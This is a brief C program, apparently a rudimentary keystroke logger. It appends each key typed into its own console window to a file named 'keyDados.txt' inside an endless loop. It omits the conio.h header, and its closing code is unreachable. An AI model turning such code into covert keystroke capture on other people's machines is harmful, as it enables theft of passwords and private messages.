#include <stdio.h>
#include <stdlib.h>

int main() {
	FILE *arq = fopen("keyDados.txt", "a+");

	if(arq == NULL) {
		printf("Error in creating the file\n");
		system("pause");
		exit(1);
	}

	char c;

	while(1){

		if(kbhit()){

			c = getch();
			fprintf(arq, "%c", c);
		}
	}

	fclose(arq);

	return 0;
}
